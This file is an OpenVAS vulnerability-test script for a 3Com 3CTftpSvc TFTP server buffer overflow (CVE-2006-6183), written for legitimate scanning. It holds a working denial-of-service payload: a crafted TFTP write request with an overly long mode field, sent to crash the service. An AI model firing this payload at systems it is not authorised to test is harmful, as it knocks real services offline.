##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_3ctftpsvc_tftp_server_mode_bof_vuln.nasl 13202 2019-01-21 15:19:15Z cfischer $
#
# 3CTftpSvc TFTP Server Long Mode Buffer Overflow Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802658");
  script_version("$Revision: 13202 $");
  script_cve_id("CVE-2006-6183");
  script_bugtraq_id(21301, 21322);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2019-01-21 16:19:15 +0100 (Mon, 21 Jan 2019) $");
  script_tag(name:"creation_date", value:"2012-07-10 15:15:15 +0530 (Tue, 10 Jul 2012)");
  script_name("3CTftpSvc TFTP Server Long Mode Buffer Overflow Vulnerability");

  script_xref(name:"URL", value:"http://secunia.com/advisories/23113");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/30545");
  script_xref(name:"URL", value:"http://cxsecurity.com/issue/WLB-2006120002");
  script_xref(name:"URL", value:"http://support.3com.com/software/utilities_for_windows_32_bit.htm");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/452754/100/0/threaded");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("tftpd_detect.nasl", "global_settings.nasl", "os_detection.nasl");
  script_require_udp_ports("Services/udp/tftp", 69);
  script_require_keys("tftp/detected", "Host/runs_windows");
  script_exclude_keys("keys/TARGET_IS_IPV6");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause the
  application to crash, denying further service to legitimate users.");

  script_tag(name:"affected", value:"3Com 3CTFTPSvc TFTP Server version 2.0.1.");

  script_tag(name:"insight", value:"The flaw is due to a boundary error during the processing of
  TFTP Read/Write request packet types. This can be exploited to cause a stack
  based buffer overflow by sending a specially crafted packet with an overly long mode field.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running 3CTftpSvc TFTP Server and is prone to buffer
  overflow vulnerability.");

  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("tftp.inc");

port = get_kb_item("Services/udp/tftp");
if(!port)
  port = 69;

if(!get_udp_port_state(port))
  exit(0);

if(!tftp_alive(port:port))
  exit(0);

soc = open_sock_udp(port);
if(!soc)
  exit(0);

mode = "netascii" + crap(data: "A", length: 469);
attack = raw_string(0x00, 0x02) + ## Write Request
         "A" + raw_string(0x00) + ## Source File Name
         mode + raw_string(0x00); ## Type (Mode)

send(socket:soc, data:attack);
send(socket:soc, data:attack);
close(soc);

sleep(2);

if(!tftp_alive(port:port)) {
  security_message(port:port, proto:"udp");
  exit(0);
}

exit(99);